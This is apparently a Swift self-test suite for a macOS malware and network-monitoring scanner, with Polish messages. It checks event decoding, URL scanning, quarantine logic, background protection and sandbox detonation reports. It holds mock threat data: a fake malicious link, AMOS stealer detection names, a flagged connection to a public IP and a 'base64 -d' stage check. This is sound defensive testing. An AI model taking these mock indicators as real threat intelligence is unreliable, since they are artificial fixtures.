            if let sl = net.syslog, let lan = net.lan, let certs = net.certificates {
                check(sl.available && sl.count("ssh_failed") == 37 && sl.count("xprotect_scans") == 58 && sl.securityDays == 7
                      && sl.privacyDays == 0.5 && sl.historyShorter && sl.events.first?.severity == .suspicious
                      && sl.events.first?.category == "remote_login", "mega: logi systemowe (liczniki, okno, zdarzenia od najgorszego)")
                check(lan.wifiConnected && lan.securityLevel == "wpa2" && lan.gatewayIP == "192.168.1.1" && lan.dns.count == 2
                      && lan.arpEntries == 7 && lan.arpSuspicious.isEmpty && lan.arpMultiIP.count == 1 && lan.ipv6Routers == 1,
                      "mega: sieć lokalna (Wi‑Fi, router, ARP, IPv6)")
                check(certs.count == 1 && certs[0].kind == "interception_tool" && certs[0].risk == "low" && certs[0].tool == "Charles Proxy"
                      && certs[0].isCA && certs[0].selfSigned && !certs[0].expired, "mega: certyfikat Charles Proxy (risk low)")
            } else { check(false, "mega: network.syslog / lan / certificates") }
            check(s.environment?.findings.contains { $0.category == "syslog" && $0.severity == .suspicious } == true
                  && s.environment?.findings.contains { $0.category == "certs" } == true, "mega: znaleziska „syslog” i „certs”")
            check(s.environment?.findings.contains { $0.category == "network_live" && $0.severity == .suspicious } == true,
                  "mega: alarm monitora jako znalezisko środowiska (network_live)")
        } else { check(false, "mega: summary.network") }
        check(summary(raw(config, ["laptop", "--level", "deep"]))?.network?.monitor == nil, "deep: brak monitora sieci")
        if let cn = summary(raw(config, ["laptop", "--level", "mega"], env: ["CERBER_MOCK_CLEAN": "1"]))?.network {
            check(cn.certificates?.isEmpty == true && cn.syslog?.events.allSatisfy { $0.severity == .info } == true
                  && cn.syslog?.count("ssh_failed") == 0, "mega czysty: brak certyfikatów, logi bez alarmów")
        } else { check(false, "mega czysty: network") }

        // net events never move the stepper; the list is capped and newest first
        let sn = ScanSession(request: ScanRequest(mode: .laptop, arguments: [], title: "x", level: .mega, ai: false, origin: .laptop))
        sn.apply(.stage(id: "scan", title: "Skanowanie plików…"))
        for i in 0..<(ScanSession.netEventCap + 50) {
            if case .event(let e) = EventDecoder.decode(line: #"{"ev":"net_event","item":{"id":"ne-\#(i)","kind":"connection","severity":"info","title":"t\#(i)"}}"#) {
                sn.apply(e)
            }
        }
        if case .event(let e) = EventDecoder.decode(line: #"{"ev":"net_status","active":true,"polls":3}"#) { sn.apply(e) }
        check(sn.currentStage == "scan" && sn.visited == ["scan"] && sn.netStatus?.polls == 3,
              "net_status/net_event nie zmieniają etapu")
        check(sn.netEvents.count == ScanSession.netEventCap && sn.netEvents.first?.title == "t\(ScanSession.netEventCap + 49)",
              "zdarzenia sieci: limit \(ScanSession.netEventCap), najnowsze na górze")

        print("\n• naruszenie sandboksa")
        r = raw(config, ["scan", home + "/Downloads"], env: ["CERBER_MOCK_VIOLATION": "1"])
        basic(r, "sandbox_violation")
        let sv = ScanSession(request: ScanRequest(mode: .scan, arguments: [], title: "x", level: .deep, ai: false, origin: .file))
        for e in r.events { sv.apply(e) }
        sv.processExited(code: r.exitCode)
        check(sv.sandboxViolation?.count == 2 && sv.phase == .failed(cancelled: false) && sv.summary == nil && sv.fatalMessage != nil,
              "sandbox_violation: problemy zapisane, skan przerwany, błąd krytyczny")

        // ---------------------------------------------------------------- url ("Sprawdź link")
        print("\n• url")
        r = raw(config, ["url", "https://example.com/narzedzie/pobierz"])
        basic(r, "url czysty")
        if let s = summary(r), let u = s.url {
            check(s.mode == .url && s.verdict == .clean && s.results.isEmpty, "czysty link: CLEAN, brak wyników")
            check(u.redirects.count == 2 && u.tls?.issuer != nil && u.hasPage && u.linksFound == 14, "przekierowania, TLS, strona")
            check(u.files.count == 3 && u.files.allSatisfy { $0.sha256 != nil } && u.skipped.count == 2 && !u.notes.isEmpty,
                  "pliki ze strony, pominięte, uwagi")
            check((s.sandbox?.tree.count ?? 0) > 3 && s.sandbox?.hasExtraction == true, "drzewo sandboksa")
        } else { check(false, "url: done z sekcją url") }
        check(r.events.contains { if case .progress(let p) = $0 { return p.stage == "download" && p.filesTotal == 3 && p.fraction != nil }; return false },
              "postęp pobierania z files/files_total")
        let su = ScanSession(request: ScanRequest(mode: .url, arguments: [], title: "x", level: .deep, ai: false, origin: .link))
        for e in r.events { su.apply(e) }
        check(su.visited == ["check", "download", "sandbox", "extract", "load", "scan", "report"] && su.stageOrder == su.visited,
              "url: etapy \(su.visited)")
        r = raw(config, ["url", "https://bit.ly/malware-faktura"])
        basic(r, "url złośliwy")
        if let s = summary(r), let u = s.url {
            check(s.verdict == .malicious && u.ioc.count == 2 && u.tls == nil && u.redirects.count == 3, "złośliwy link: IOC, http, 2 przekierowania")
            check(s.results.first?.primary == "YARA:MacOS_Stealer_AMOS" && !s.results.first!.canQuarantine, "AMOS w pobranym zipie")
        } else { check(false, "url złośliwy: done") }
        if case .event(.done(let s)) = EventDecoder.decode(line: #"{"ev":"done","summary":{"mode":"url","verdict":"MALICIOUS","results":[],"url":{"input":"http://x.top/a","ioc":["URLhaus: x"],"tls":null,"page":null}}}"#) {
            check(s.mode == .url && s.results.isEmpty && s.url?.ioc.count == 1 && s.url?.hasPage == false,
                  "werdykt z samego IOC (bez wyników)")
        } else { check(false, "url: samo IOC") }

        // ---------------------------------------------------------------- AI model install
        print("\n• ai-install / info")
        r = raw(config, ["info"])
        if case .info(let i)? = r.events.first {
            check(i.aiInstallable && i.aiModelSize == 4_920_780_160 && i.llamaServer == true && i.aiDownloadPartial == 0
                  && i.aiModelRecommended == i.aiModel && !i.aiUpgradeAvailable,
                  "info: ai_installable, ai_model_size, ai_download_partial, llama_server, ai_model_recommended")
        } else { check(false, "info z polami AI") }
        r = raw(config, ["ai-install"])
        check(r.events.count == 1 && r.exitCode == 0, "ai-install przy zainstalowanym modelu: od razu ai_installed")
        let markerPath = NSTemporaryDirectory() + "cerber-mock-ai-installed-\(ProcessInfo.processInfo.processIdentifier)"
        try? FileManager.default.removeItem(atPath: markerPath)
        r = raw(config, ["ai-install"], env: ["CERBER_MOCK_AI": "fail"])
        check(r.exitCode == 1 && r.events.contains { if case .error(let m, true) = $0 { return m.hasPrefix("Instalacja modelu AI") }; return false },
              "błąd pobierania: kod 1, error fatal")
        r = raw(config, ["info"], env: ["CERBER_MOCK_AI": "nollama"])
        if case .info(let i)? = r.events.first { check(i.aiModel != nil && i.llamaServer == false, "info: brak llama-server") }
        r = raw(config, ["ai-install"], env: ["CERBER_MOCK_AI": "nollama"])
        check(r.events.contains { if case .aiInstalled(_, _, let srv) = $0 { return srv == nil }; return false }, "ai_installed z llama_server=null")
        if case .event(.aiInstalled(let model, _, let srv)) = EventDecoder.decode(line: #"{"ev":"ai_installed","model":"m.gguf","llama_server":true}"#) {
            check(model == "m.gguf" && srv != nil, "ai_installed: llama_server jako bool")
        }

        // AppModel: the model is downloaded only after the user's click ("Pobierz model AI"), never at launch
        func waitUntil(_ seconds: Double, _ cond: () -> Bool) {
            let t0 = Date()
            while !cond() && Date().timeIntervalSince(t0) < seconds { RunLoop.main.run(until: Date().addingTimeInterval(0.05)) }
        }
        setenv("CERBER_MOCK_SPEED", "25", 1)
        setenv("CERBER_MOCK_AI", "missing", 1)
        let m1 = AppModel(config: config)
        m1.loadInfo()
        waitUntil(10) { m1.infoState == .loaded }
        waitUntil(1.5) { m1.aiInstall != .idle }
        check(m1.aiInstall == .idle && m1.info?.aiModel == nil && m1.aiStatusNote?.contains("Pobierz model AI") == true,
              "aplikacja: brak modelu → nic nie pobiera się samo, przycisk „Pobierz model AI” z rozmiarem")
        m1.downloadAIModel()
        var sawProgress = false
        let t0 = Date()
        while Date().timeIntervalSince(t0) < 40 && !(m1.aiInstall == .installed && m1.info?.aiModel != nil && m1.infoState == .loaded) {
            RunLoop.main.run(until: Date().addingTimeInterval(0.03))
            if let f = m1.aiInstall.fraction, f > 0 { sawProgress = true }
        }
        check(sawProgress, "aplikacja: pobieranie modelu po kliknięciu, postęp widoczny")
        check(m1.aiInstall == .installed && m1.info?.aiModel != nil, "aplikacja: po ai_installed ponowne info → model dostępny")
        let userChoice = UserDefaults.standard.object(forKey: AppModel.aiPreferenceKey) as? Bool
        check(m1.aiAvailable && m1.aiEnabled == (userChoice ?? false),
              "aplikacja: przełącznik AI domyślnie wyłączony (zapamiętany wybór: \(userChoice.map { String($0) } ?? "brak"))")
        try? FileManager.default.removeItem(atPath: markerPath)
        setenv("CERBER_MOCK_AI", "fail", 1)
        let m2 = AppModel(config: config)
        m2.loadInfo()
        waitUntil(10) { m2.infoState == .loaded }
        m2.downloadAIModel()
        waitUntil(30) { if case .failed = m2.aiInstall { return true }; return false }
        if case .failed(let msg) = m2.aiInstall { check(msg.hasPrefix("Instalacja modelu AI"), "aplikacja: błąd pobierania → komunikat + ponów") }
        else { check(false, "aplikacja: stan błędu pobierania (\(m2.aiInstall))") }
        check(!m2.aiAvailable && m2.aiStatusNote?.contains("ponów") == true, "aplikacja: przełącznik AI wyjaśnia błąd")
        setenv("CERBER_MOCK_AI", "missing", 1)
        setenv("CERBER_MOCK_SPEED", "1", 1)
        let m3 = AppModel(config: config)
        m3.loadInfo()
        waitUntil(10) { m3.infoState == .loaded }
        m3.downloadAIModel()
        waitUntil(15) { (m3.aiInstall.fraction ?? 0) > 0.03 }
        check(m3.aiInstall.isDownloading && m3.aiStatusNote?.contains("po pobraniu") == true, "aplikacja: w trakcie pobierania AI niedostępne, skan możliwy")
        m3.shutdown()
        waitUntil(5) { !m3.aiInstall.isDownloading }
        check(m3.aiInstall == .idle && !FileManager.default.fileExists(atPath: markerPath), "zamknięcie aplikacji przerywa pobieranie (wznowi się)")
        setenv("CERBER_MOCK_AI", "old", 1)
        setenv("CERBER_MOCK_SPEED", "25", 1)
        let m4 = AppModel(config: config)
        m4.loadInfo()
        waitUntil(10) { m4.infoState == .loaded }
        waitUntil(1.5) { m4.aiInstall != .idle }
        check(m4.aiAvailable && m4.info?.aiUpgradeAvailable == true && m4.aiInstall == .idle,
              "aplikacja: starszy model działa, lepszy tylko proponowany (bez pobierania w tle)")
        m4.downloadAIModel()
        waitUntil(40) { m4.aiInstall == .installed && m4.info?.aiUpgradeAvailable == false && m4.infoState == .loaded }
        check(m4.info?.aiModel == m4.info?.aiModelRecommended && m4.info?.aiUpgradeAvailable == false,
              "aplikacja: po kliknięciu „Pobierz lepszy model AI” używany jest nowy model")
        unsetenv("CERBER_MOCK_AI")
        unsetenv("CERBER_MOCK_SPEED")
        try? FileManager.default.removeItem(atPath: markerPath)

        // ---------------------------------------------------------------- background protection (watch)
        print("\n• ochrona w tle (watch run --app)")
        r = raw(config, ["watch", "run", "--app", "--level", "quick", "--quarantine"])
        basic(r, "watch")
        let prot = BackgroundProtection(config: config)
        for e in r.events { if case .watch(let w) = e { prot.apply(w) } }
        check(prot.status == .running && prot.spots.count == 10 && prot.spots.filter { !$0.ok }.count == 1, "watch_ready: miejsca, 1 bez dostępu")
        check(prot.spots.first { !$0.ok }?.isPermissionError == true, "błąd TCC rozpoznany (podpowiedź o Prywatności)")
        check(prot.verified.count == 4, "watch_sandbox: samosprawdzenie")
        check(prot.activity.count == 3 && prot.activity.allSatisfy { $0.phase == .done }, "aktywność: 3 pozycje scalone (nowy → skanowanie → wynik)")
        check(prot.activity.first?.verdict == .info && prot.activity.first?.name == "com.spotify.webhelper.plist", "aktywność: najnowsze na górze")
        if let bad = prot.activity.first(where: { $0.verdict == .malicious }) {
            check(bad.quarantinedCount == 1 && bad.report != nil && bad.flagged.first?.primary == "YARA:MacOS_Stealer_AMOS",
                  "złośliwy plik: kwarantanna, raport, wykrycie")
        } else { check(false, "aktywność: złośliwy plik") }
        check(prot.lastAlert?.report != nil && prot.workerState == "stopped", "watch_alert zapamiętany, silnik uśpiony")
        prot.level = .quick                 // the user's own saved choices must not change the test (not persisted)
        prot.autoQuarantine = false
        prot.netGuard = false
        check(prot.arguments == ["watch", "run", "--app", "--level", "quick"], "argumenty: \(prot.arguments)")
        prot.autoQuarantine = true
        prot.level = .deep
        check(prot.arguments == ["watch", "run", "--app", "--level", "deep", "--quarantine"], "argumenty z kwarantanną, dokładny")
        prot.netGuard = true
        check(prot.arguments.last == "--net", "argumenty z nadzorem sieci (--net)")
        check(prot.netEvents.isEmpty && prot.netStatus == nil, "bez --net: brak zdarzeń sieci")

        // network & remote-access guard
        r = raw(config, ["watch", "run", "--app", "--level", "quick", "--net"])
        basic(r, "watch --net")
        let np = BackgroundProtection(config: config)
        for e in r.events { if case .watch(let w) = e { np.apply(w) } }
        check(np.netEvents.count == 3 && np.netEvents.first?.kind == "log" && np.netAlerts == 2,
              "watch_net: 3 zdarzenia, najnowsze na górze, 2 alarmy (\(np.netEvents.count), \(np.netAlerts))")
        check(np.netEvents.contains { $0.severity == .suspicious && $0.kindLabel == "Przychodzące" },
              "watch_net: połączenie z ekranem jako podejrzane")
        check(np.netStatus?.polls == 12 && np.netStatus?.permissions == false && np.netStatus?.logChecked != nil
              && np.netStatus?.stats.publicNew == 17, "watch_net_status: sprawdzenia, dziennik, brak uprawnień TCC")
        check(np.netReport?.hasSuffix(".html") == true && FinderActions.exists(np.netReport), "raport sieci zapisany")

        // report window: "Do kwarantanny" only where the JSON twin agrees and the file is still there
        let rdir = URL(fileURLWithPath: NSTemporaryDirectory()).appendingPathComponent("cerber-report-selftest-\(ProcessInfo.processInfo.processIdentifier)")
        try? FileManager.default.createDirectory(at: rdir, withIntermediateDirectories: true)
        let evil = rdir.appendingPathComponent("evil.sh").path
        let meh = rdir.appendingPathComponent("meh.sh").path
        FileManager.default.createFile(atPath: evil, contents: Data("echo\n".utf8))
        FileManager.default.createFile(atPath: meh, contents: Data("echo\n".utf8))
        let gone = rdir.appendingPathComponent("gone.sh").path
        let results: [[String: Any]] = [["path": evil, "verdict": "MALICIOUS", "score": 120],
                                        ["path": meh, "verdict": "SUSPICIOUS", "score": 40],
                                        ["path": gone, "verdict": "MALICIOUS", "score": 90],
                                        ["path": evil + ">>inner.js", "verdict": "MALICIOUS", "score": 90]]
        if let jd = try? JSONSerialization.data(withJSONObject: ["results": results]) {
            FileManager.default.createFile(atPath: rdir.appendingPathComponent("r.json").path, contents: jd)
        }
        let links = (0..<4).map { "<a class=\"qbtn\" data-i=\"\($0)\" href=\"cerber-report://quarantine/\($0)\">Do kwarantanny</a>" }
        FileManager.default.createFile(atPath: rdir.appendingPathComponent("r.html").path,
                                       contents: Data(("<html><head><style>.qbtn{display:none}</style></head><body>" + links.joined(separator: "\n") + "</body></html>").utf8))
        let page = ReportPage(path: rdir.appendingPathComponent("r.html").path, config: nil)
        page.load()
        check(page.html.contains(".qbtn{display:inline-block}") && page.html.contains(links[0]),
              "raport w aplikacji: przycisk kwarantanny widoczny dla złośliwego pliku")
        check(!page.html.contains(links[1]) && page.html.contains("niskie ryzyko"), "raport: bez przycisku przy niskim ryzyku")
        check(!page.html.contains(links[2]) && page.html.contains("pliku już nie ma"), "raport: bez przycisku, gdy pliku nie ma")
        check(!page.html.contains(links[3]) && page.html.contains("w archiwum"), "raport: bez przycisku dla pliku w archiwum")
        check(page.quarantinableCount == 1 && page.check(0) == nil && page.check(7) != nil, "raport: tylko 1 plik do kwarantanny")
        page.quarantine(1)
        check(page.busy.isEmpty && page.messageIsError, "raport: kliknięcie niedozwolonego przycisku nic nie przenosi")
        try? FileManager.default.removeItem(at: rdir)

        setenv("CERBER_MOCK_SPEED", "8", 1)
        setenv("CERBER_MOCK_SYNTHETIC", "1", 1)
        let live = BackgroundProtection(config: config)
        live.start()
        waitUntil(30) { live.activity.contains { $0.verdict == .malicious } }
        check(live.status == .running && live.activity.contains { $0.verdict == .malicious }, "proces na żywo: wyniki napływają")
        live.stop()
        waitUntil(10) { live.status == .off }
        check(live.status == .off, "wyłączenie ochrony zatrzymuje proces")
        // stdin EOF alone must stop the watcher (the app died)
        let wp = BackendProcess(config: config, arguments: ["watch", "run", "--app"])
        wp.keepStdinOpen = true
        var ready = false
        var wExit: Int32? = nil
        wp.onEvents = { evs in if evs.contains(where: { if case .watch(let w) = $0 { return w.ev == "watch_ready" }; return false }) { ready = true } }
        wp.onExit = { wExit = $0 }
        try? wp.start()
        waitUntil(10) { ready }
        wp.closeStdin()
        waitUntil(10) { wExit != nil }
        check(ready && wExit == 0, "zamknięcie stdin kończy obserwatora (kod \(wExit.map(String.init) ?? "brak"))")
        unsetenv("CERBER_MOCK_SPEED")
        unsetenv("CERBER_MOCK_SYNTHETIC")

        // ---------------------------------------------------------------- localhost API server (fake module)
        print("\n• API na localhost (atrapa cerber.api_server)")
        let fm = FileManager.default
        let apiRoot = URL(fileURLWithPath: NSTemporaryDirectory()).appendingPathComponent("cerber-api-selftest-\(ProcessInfo.processInfo.processIdentifier)")
        try? fm.removeItem(at: apiRoot)
        try? fm.createDirectory(at: apiRoot.appendingPathComponent("cerber"), withIntermediateDirectories: true)
        try? fm.createDirectory(at: apiRoot.appendingPathComponent(".venv/bin"), withIntermediateDirectories: true)
        let realPython = fm.isExecutableFile(atPath: config.venvPython.path) ? config.venvPython.path : "/usr/bin/python3"
        try? fm.createSymbolicLink(atPath: apiRoot.appendingPathComponent(".venv/bin/python").path, withDestinationPath: realPython)
        try? "".write(to: apiRoot.appendingPathComponent("cerber/__init__.py"), atomically: true, encoding: .utf8)
        let fake = """
        import argparse, json, os, signal, sys, time
        ap = argparse.ArgumentParser(); ap.add_argument("--port", type=int, default=8765); ap.add_argument("--token")
        a = ap.parse_args()
        if os.environ.get("FAKE_API_CRASH") == "1":
            print("Traceback (most recent call last):", file=sys.stderr)
            print("OSError: [Errno 48] Address already in use", file=sys.stderr, flush=True)
            sys.exit(1)
        stop = []
        signal.signal(signal.SIGINT, lambda *_: stop.append(1))
        print(json.dumps({"ev": "api_ready", "url": f"http://127.0.0.1:{a.port}", "token": a.token,
                          "docs": f"http://127.0.0.1:{a.port}/"}), flush=True)
        print(f"serving with token {len(a.token or '')} chars", file=sys.stderr, flush=True)
        while not stop:
            time.sleep(0.05)
        """
        try? fake.write(to: apiRoot.appendingPathComponent("cerber/api_server.py"), atomically: true, encoding: .utf8)
        let apiConfig = BackendConfig(root: apiRoot, mock: false)
        let api = APIServer(config: apiConfig)
        api.token = APIServer.generateToken()
        check(api.token?.count == 43 && !(api.token ?? "").contains("="), "token: 32 bajty base64url (43 znaki)")
        api.start()
        waitUntil(15) { api.isRunning }
        check(api.state == .running(url: "http://127.0.0.1:8765", docs: "http://127.0.0.1:8765/"), "serwer: api_ready → działa (\(api.state))")
        check(api.curlExample.contains("Bearer \(api.token ?? "")") && api.curlExample.hasSuffix("/api/info"), "przykład curl z tokenem")
        api.stop()
        waitUntil(10) { api.state == .off }
        check(api.state == .off, "wyłączenie: SIGINT → serwer zatrzymany")
        setenv("FAKE_API_CRASH", "1", 1)
        api.start()
        waitUntil(15) { if case .failed = api.state { return true }; return false }
        if case .failed(let msg) = api.state {
            check(msg.contains("Address already in use") && !api.stderrTail.isEmpty, "awaria serwera: błąd z końcówką stderr")
        } else { check(false, "awaria serwera: stan błędu (\(api.state))") }
        unsetenv("FAKE_API_CRASH")
        if case .event(.apiReady(let u, let t, let d)) = EventDecoder.decode(line: #"{"ev":"api_ready","url":"http://127.0.0.1:9000","token":"x","docs":"http://127.0.0.1:9000/"}"#) {
            check(u.hasSuffix(":9000") && t == "x" && d != nil, "zdarzenie api_ready")
        } else { check(false, "zdarzenie api_ready") }
        try? fm.removeItem(at: apiRoot)

        // ---------------------------------------------------------------- lenient decoding
        print("\n• odporność dekodera")
        func one(_ line: String) -> DecodedLine { EventDecoder.decode(line: line) }
        if case .event(.progress(let p)) = one(#"{"ev":"progress","stage":"scan","done":"12","total":null,"extra":{"x":1}}"#) {
            check(p.done == 12 && p.total == nil && p.fraction == nil, "liczby jako tekst, null, nieznane pola")
        } else { check(false, "progress z dziwnymi typami") }
        if case .event(.unknown(let n)) = one(#"{"ev":"nowe_zdarzenie","a":1}"#) { check(n == "nowe_zdarzenie", "nieznane zdarzenie ignorowane") }
        else { check(false, "nieznane zdarzenie") }
        if case .invalid = one("Traceback (most recent call last):") { check(true, "linia nie-JSON → invalid") } else { check(false, "nie-JSON") }
        if case .blank = one("   ") { check(true, "pusta linia") } else { check(false, "pusta linia") }
        if case .event(.finding(let f)) = one(#"{"ev":"finding","item":{"path":"/a","verdict":"malicious","score":"130","detections":[{"name":"X","confidence":"high"}]}}"#) {
            check(f.verdict == .malicious && f.score == 130 && f.detections.first?.confidence == "HIGH", "finding: małe litery, score tekstem")
        } else { check(false, "finding lenient") }
        if case .event(.done(let s)) = one(#"{"ev":"done","summary":{"verdict":"WEIRD","counts":{"CLEAN":"5"},"network":null,"results":[{},{}]}}"#) {
            check(s.verdict == .info && s.count(.clean) == 5 && s.network == nil && s.results.count == 2 && s.results[0].id != s.results[1].id,
                  "done z brakami: domyślne wartości, unikalne id")
        } else { check(false, "done lenient") }
        if case .event(.done(let s)) = one(#"{"ev":"done","summary":{"environment":{"posture":{"firewall":true}}}}"#) {
            check(s.environment?.posture.firewall == "on", "posture.firewall jako bool")
        } else { check(false, "posture bool") }

        print("\n• analiza zachowania (detonacja)")
        if case .event(.done(let s)) = one(realDetonationDone), let res = s.results.first, let dn = res.detonation {
            check(s.mode == .sandbox && s.results.count == 1 && res.verdict == .malicious, "prawdziwy done: 1 wynik MALICIOUS")
            check(dn.ran && dn.kind == "bash" && dn.seconds == 33.38 && !dn.timedOut && dn.verdict == .malicious && dn.score == 145,
                  "prawdziwy done: ran, kind, seconds, timed_out, verdict, score")
            check(dn.behaviors.count == 5 && dn.behaviors.first?.level == .medium && dn.behaviors.last?.level == .low
                  && dn.behaviors.first?.evidence.isEmpty == false, "zachowania: severity „medium”/„low” rozpoznane, dowody")
            check(dn.network.count == 2 && dn.network.allSatisfy { $0.ioc == nil && $0.kind == "ip" && $0.url != nil },
                  "adresy: url, kind, ioc=null")
            check(dn.commands.count == 8 && dn.filesRead.isEmpty && dn.filesWritten.isEmpty && dn.limitations.isEmpty,
                  "polecenia; /dev/tty pominięte w zapisach")
            check(dn.stages.count == 1 && dn.stages[0].detections.count == 6 && dn.stages[0].sourcePreview?.contains("base64 -d") == true,
                  "odkodowany etap: podgląd + 6 wykryć")
            let behav = res.detections.filter { $0.engine == "detonate" }
            check(behav.count == 5 && behav.allSatisfy { $0.name.hasPrefix("Behav:") }
                  && res.detections.contains { $0.engine == "heuristic" && $0.name.hasPrefix("Behav:Stage.") },
                  "wykrycia: 5 × detonate (Behav:…) + Behav:Stage z heurystyki")
            check(EngineStyle.label("detonate") == "Sandbox (zachowanie)", "etykieta silnika: „\(EngineStyle.label("detonate"))”")
        } else { check(false, "prawdziwy done z detonation") }
        if case .event(.done(let s)) = one(#"{"ev":"done","summary":{"results":[{"path":"/a.sh","detonation":null},{"path":"/b.py","detonation":{"ran":"false","behaviors":[{"title":"x","severity":"weird"}],"network":[{"target":"h"},{"target":"h"}],"stages":[{"source_preview":"  "}]}}]}}"#) {
            let dn = s.results[1].detonation
            check(s.results[0].detonation == nil && dn?.ran == false && dn?.behaviors.first?.level == .info
                  && dn?.network.count == 1 && dn?.network.first?.display == "h" && dn?.stages.isEmpty == true && dn?.seconds == nil,
                  "detonation: null, ran=false, nieznana waga, zdublowane adresy, pusty etap")
        } else { check(false, "detonation lenient") }
        let sb = ScanSession(request: ScanRequest(mode: .scan, arguments: [], title: "x", level: .deep, ai: true, origin: .file))
        for line in [#"{"ev":"stage","id":"scan","title":"Skanowanie plików…"}"#,
                     #"{"ev":"finding","item":{"path":"/d/a.sh","verdict":"SUSPICIOUS","score":40}}"#,
                     #"{"ev":"stage","id":"behavior","title":"Analiza zachowania: 2 podejrzanych skryptów w zamkniętym sandboksie…"}"#,
                     #"{"ev":"progress","stage":"behavior","done":1,"total":2,"current":"a.sh"}"#,
                     #"{"ev":"finding","item":{"path":"/d/a.sh","verdict":"MALICIOUS","score":95,"detonation":{"ran":true}}}"#] {
            if case .event(let e) = one(line) { sb.apply(e) }
        }
        let so = sb.stageOrder
        check(sb.currentStage == "behavior" && so.firstIndex(of: "behavior") == so.firstIndex(of: "scan").map { $0 + 1 }
              && (so.firstIndex(of: "behavior") ?? 99) < (so.firstIndex(of: "ai") ?? -1) && so.count == Set(so).count,
              "nieoczekiwany etap „behavior” wstawiony po „scan”, przed „ai”: \(so)")
        check(sb.currentProgress?.fraction == 0.5 && Stage.shortTitle("behavior") == "Zachowanie" && Stage.icon("behavior") == "testtube.2",
              "postęp zachowania 1/2 = 50%, etykieta i ikona")
        check(sb.findings.count == 1 && sb.findings[0].verdict == .malicious && sb.findings[0].detonation != nil,
              "finding po detonacji aktualizuje wpis na miejscu")
        if case .event(.netStatus(let st)) = one(#"{"ev":"net_status","active":"true","since":"2026-10-07 12:00:01","polls":"42","interval_s":5,"connections_new":37,"public_new":21,"listening_new":1,"inbound":0,"sessions_new":0,"processes_remote":0,"uploaded_bytes":12345678,"alerts":1,"nowe":[1]}"#) {
            check(st.active && st.polls == 42 && st.intervalS == 5 && st.stats.publicNew == 21 && st.stats.uploadedBytes == 12_345_678
                  && st.stats.alerts == 1 && Fmt.time(st.since) == "12:00", "net_status: liczniki, tekstowe liczby, since")
        } else { check(false, "net_status") }
        if case .event(.netStatus(let st)) = one(#"{"ev":"net_status","active":false}"#) {
            check(!st.active && st.polls == 0 && st.stats.connectionsNew == 0 && st.intervalS == nil, "net_status: same braki → zera")
        } else { check(false, "net_status z brakami") }
        if case .event(.netEvent(let e)) = one(#"{"ev":"net_event","item":{"id":"ne-12","time":"12:03:44","kind":"Connection","severity":"SUSPICIOUS","title":"python3 → 185.220.101.4:9001","detail":"x","process":"python3","pid":"123","exe":null,"remote":"185.220.101.4:9001","host":null}}"#) {
            check(e.id == "ne-12" && e.kind == "connection" && e.severity == .suspicious && e.isAlert && e.pid == 123
                  && e.exe == nil && e.host == nil && e.signer == nil && Fmt.time(e.time, seconds: true) == "12:03:44",
                  "net_event: wielkie litery, null, brakujące pola")
        } else { check(false, "net_event") }
        if case .event(.netEvent(let e)) = one(#"{"ev":"net_event","item":{"severity":"weird","title":"Port 3000"}}"#) {
            check(e.severity == .info && !e.isAlert && !e.id.isEmpty && e.kind.isEmpty, "net_event bez id i z nieznaną wagą → info")
        } else { check(false, "net_event minimalny") }
        let monitorJSON = #""monitor":{"started":"2026-10-07 12:00:01","ended":"2026-10-07 13:10:00","seconds":4199,"polls":700,"interval_s":5,"stats":{"connections_new":37,"public_new":21,"listening_new":1,"inbound":0,"sessions_new":0,"processes_remote":0,"uploaded_bytes":12345678,"alerts":1},"events":[{"id":"ne-1","time":"12:03:44","kind":"connection","severity":"low","title":"a"},{"id":"ne-1","kind":"listen","severity":"info","title":"b"}],"new_public":[{"time":"12:03:44","process":"Google Chrome Helper","pid":812,"remote":"142.250.1.1","port":443,"host":"waw02s.1e100.net","signer":"Developer ID: Google LLC"}],"uploads":[{"process":"rclone","pid":4411,"exe":"/opt/homebrew/bin/rclone","bytes_out":734003200,"bytes_in":1200}],"limitations":["x"]}"#
        if case .event(.done(let s)) = one(#"{"ev":"done","summary":{"mode":"laptop","level":"mega","network":{"summary":{"public_connections":3},"listening":[],"#
                                            + monitorJSON + "}}}") {
            let m = s.network?.monitor
            check(s.network?.hasAudit == true && m?.polls == 700 && m?.seconds == 4199 && m?.stats.publicNew == 21 && m?.alertCount == 1
                  && m?.newPublic.first?.port == 443 && m?.uploads.first?.bytesOut == 734_003_200 && m?.limitations == ["x"],
                  "summary.network.monitor: pełny")
            check(m?.events.count == 2 && m?.events[0].id != m?.events[1].id, "monitor: zdublowane id zdarzeń rozróżnione")
        } else { check(false, "done z network.monitor") }
        if case .event(.done(let s)) = one(#"{"ev":"done","summary":{"mode":"laptop","level":"mega","network":{"# + monitorJSON + "}}}") {
            let n = s.network
            check(n != nil && n?.hasAudit == false && n?.monitor?.events.count == 2 && n?.listening.isEmpty == true
                  && n?.summary.publicConnections == nil && n?.trafficHistory == nil,
                  "network z samym „monitor” (audyt na starcie się nie powiódł)")
        } else { check(false, "done z network = {monitor}") }
        if case .event(.done(let s)) = one(#"{"ev":"done","summary":{"network":{"summary":{},"monitor":null}}}"#) {
            check(s.network?.monitor == nil && s.network?.hasAudit == true, "starszy raport: brak monitora")
            check(s.network?.syslog == nil && s.network?.lan == nil && s.network?.certificates == nil,
                  "starszy raport: brak logów, sieci lokalnej i certyfikatów")
        } else { check(false, "done bez monitora") }
        if case .event(.done(let s)) = one(#"{"ev":"done","summary":{"network":{"syslog":{"available":false,"reason":"brak narzędzia /usr/bin/log","events":[],"counts":{}},"lan":{"gateway":{"ip":"172.20.10.1","mac_randomized":true},"wifi":{"connected":true,"security_level":"OPEN"},"dhcp":{"dns":"9.9.9.9"},"arp_suspicious":[{"mac":"aa:bb","ips":["172.20.10.1","172.20.10.5"],"reason":"MAC routera używany też przez inny IP"}]},"certificates":[]}}}"#),
           let n = s.network {
            check(n.hasAudit && n.syslog?.available == false && n.syslog?.reason != nil && n.syslog?.historyShorter == false
                  && n.syslog?.count("ssh_failed") == nil, "syslog niedostępny: powód, brak liczników")
            check(n.lan?.securityLevel == "open" && n.lan?.macRandomized == true && n.lan?.dns == ["9.9.9.9"]
                  && n.lan?.arpSuspicious.first?.ips.count == 2 && n.lan?.ipv6Routers == 0 && n.lan?.arpEntries == nil,
                  "lan: otwarte Wi‑Fi, DNS jako tekst, podejrzany ARP, braki")
            check(n.certificates?.isEmpty == true, "certificates: [] (sprawdzono, brak) ≠ brak klucza")
        } else { check(false, "done z syslog/lan/certificates") }

        // ---------------------------------------------------------------- formatting & URL parsing
        print("\n• formatowanie i adresy")
